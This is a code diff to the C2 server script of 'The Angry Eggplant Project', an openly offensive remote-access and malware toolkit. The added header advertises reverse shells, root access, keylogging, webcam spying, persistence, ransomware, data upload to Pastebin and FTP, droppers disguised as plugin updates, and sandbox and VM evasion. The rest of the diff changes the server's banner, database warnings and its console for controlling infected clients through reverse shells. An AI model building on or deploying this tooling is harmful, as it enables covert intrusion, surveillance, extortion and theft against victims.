@@ -1,71 +1,90 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-#
-# Copyright (c) 2017 Angry Eggplant (https://github.com/colental/ae)
-#
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to deal
-# in the Software without restriction, including without limitation the rights
-# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-# copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-#
-# The above copyright notice and this permission notice shall be included in all
-# copies or substantial portions of the Software.
-#
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-# SOFTWARE.
+#!/usr/bin/python
+
+# The Angry Eggplant Project
+
+# https://github.com/colental/ae
+
+
+'''
+
+   The Angry Eggplant Project
+    
+>  30+ modules - interactive & automated
+    - Reverse Shell   remotely access host machine with a shell
+    - Root Acess      obtain administrator privileges
+    - Keylogger       log user keystrokes with the window they were entered in
+    - Webcam          capture image/video or stream live
+    - Screenshot      snap shots of the host desktop
+    - Persistence     maintain access with 8 different persistence methods
+    - Packetsniffer   monitor host network traffic for valuable information
+    - Portscanner     explore the local network for more hosts, open ports, vulnerabilities
+    - Ransom          encrypt host files and ransom them to the user for Bitcoin
+    - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
+    - Email           Outlook email of a logged in user can be accessed without authentication
+    - SMS             Send & receive SMS text messages with user's contacts
+    
+>  Portability - supports all major platforms & architectures
+    - no configuration - dynamically generates a unique client configured for the host
+    - no dependencies - packages, interpreter & modules all loaded remotely
+    - multiple file types - .exe (Windows), .sh (Linux) .app (Mac OS X), .apk (Android)
+    - normal mode - dropper is executable or application and disguised as plugin update
+    - fileless mode - everything loaded remotely, never exists on disk 
+    
+>  Security
+    - state of the art encryption - AES cipher in authenticated OCB mode with 256-bit key
+    - Diffie-Hellman Key Agreement - key is secure even on monitored networks
+    - secure communication - message confidentiality, authenticity, & integrity
+    - anti-forensics countermeasures - sandbox detection, virtual machine detection
+
+'''
 
 from __future__ import print_function
-import os
-import sys
-import cv2
-import json
-import time
-import numpy
-import Queue
-import pickle
-import socket
-import struct
-import base64
-import signal
-import random
-import hashlib
-import urllib2
-import requests
-import colorama
-import datetime
-import functools
-import cStringIO
-import threading
-import subprocess
-import collections
-import Crypto.Util
-import Crypto.Cipher.AES
-import Crypto.PublicKey.RSA
-import Crypto.Cipher.PKCS1_OAEP
-import mysql.connector
-import configparser
 
+for package in ['os', 'sys', 'cv2', 'json', 'time', 'numpy', 'Queue', 'pickle', 'socket', 'struct', 'base64', 'signal', 'random', 'hashlib', 'urllib2', 'logging', 'requests',  'warnings', 'colorama', 'datetime', 'functools', 'cStringIO', 'threading', 'subprocess', 'collections', 'configparser', 'mysql.connector', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.PublicKey.RSA', 'Crypto.Cipher.PKCS1_OAEP']:
+    try:
+        exec "import %s" % package in globals()
+    except ImportError as e:
+        print
 
+class DatabaseError(Exception):
+    pass
 
 class ServerError(Exception):
     pass
-
 
 class ClientError(Exception):
     pass
 
 
 class Server(threading.Thread):
+    '''
+    Copyright (c) 2017 Daniel Vega-Myhre
+
+    Permission is hereby granted, free of charge, to any person obtaining a copy
+    of this software and associated documentation files (the "Software"), to deal
+    in the Software without restriction, including without limitation the rights
+    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+    copies of the Software, and to permit persons to whom the Software is
+    furnished to do so, subject to the following conditions:
+
+    THE ABOVE COPYRIGHT NOTICE AND THIS PERMISSION NOTICE SHALL BE INCLUDED IN ALL
+    COPIES OR SUBSTANTIAL PORTIONS OF THE SOFTWARE.
+
+    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
+
+    IN NO EVENT SHALL THE
+    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+    SOFTWARE.
+    '''
 
     global threads
-    
+
+    banner = open('../resources/banner.txt', 'r').read() if os.path.isfile('../resources/banner.txt') else str('\n' * 30 + '\tThe Angry Eggplant Project')
+
     def __init__(self, port=1337, debug=False, **kwargs):
         super(Server, self).__init__()
         self.exit_status        = 0
@@ -90,8 +109,29 @@ class Server(threading.Thread):
         self.shell.set()
 
     def _init_handlers(self):
+        print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + self.banner + colorama.Fore.WHITE + "\n\n")
+        print(colorama.Fore.YELLOW + " [?] " + colorama.Fore.RESET + "Hint: show usage information with the 'help' command\n")
         if self.config.has_section('database'):
-            self.database.connect(**self.config['database'])
+            try:
+                self.database.config(**self.config['database'])
+                self.database.connect()
+                print(colorama.Fore.GREEN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "Connected to database\n\n")
+            except:
+                max_v = max(map(len, self.config['database'].values())) + 2
+                print(colorama.Fore.RED + colorama.Style.BRIGHT + " [!] " + colorama.Fore.RESET + '''\
+Warning: unable to connect to the currently conifgured MySQL database
+        host: %s
+        port: %s
+        user: %s
+        password: %s
+        database: %s''' % (
+    ' ' * 4 + self.config['database'].get('host').rjust(max_v),
+    ' ' * 4 + self.config['database'].get('port').rjust(max_v),
+    ' ' * 4 + self.config['database'].get('user').rjust(max_v),
+    str('*' * len(self.config['database'].get('password'))).rjust(max_v),
+    self.config['database'].get('database').rjust(max_v)
+    )
+)
         self._client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self._request_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self._client_socket.bind(('0.0.0.0', port))
@@ -390,7 +430,7 @@ class Server(threading.Thread):
 
     def display_settings(self, args=None):
         if not args:
-            print(colorama.Fore.RESET + colorama.Style.BRIGHT + '\n\n\t\tSettings')
+            print("\n\n" + colorama.Fore.GREEN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "Settings")
             print(self._text_color + self._text_style + '\tdefault text color + style')
             print(self._prompt_color + self._prompt_style + '\tdefault prompt color + style')
             print(self._text_color + self._text_style)
@@ -430,7 +470,7 @@ class Server(threading.Thread):
         info    = info if info else {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
-        print('\n' + colorama.Fore.YELLOW + colorama.Style.DIM + column1.center(max_key) + column2.center(max_val))
+        print('\n' + self._text_color + colorama.Style.BRIGHT + column1.center(max_key) + column2.center(max_val))
         for key in sorted(info):
             print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
             
@@ -807,10 +847,7 @@ if __name__ == '__main__':
     threads = collections.OrderedDict()
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
     debug = True if 'debug' in sys.argv else (True if '--debug' in sys.argv else False)
-    banner = open('../resources/banner.txt', 'r').read()
     threads['server'] = Server(port=port, debug=debug)
-    os.system('cls' if os.name is 'nt' else 'clear')
-    print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + banner + colorama.Fore.WHITE + "\n\n")
-    print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "Use 'help' for command usage information\n\n")
+#    os.system('cls' if os.name is 'nt' else 'clear')
     threads['server'].start()
  
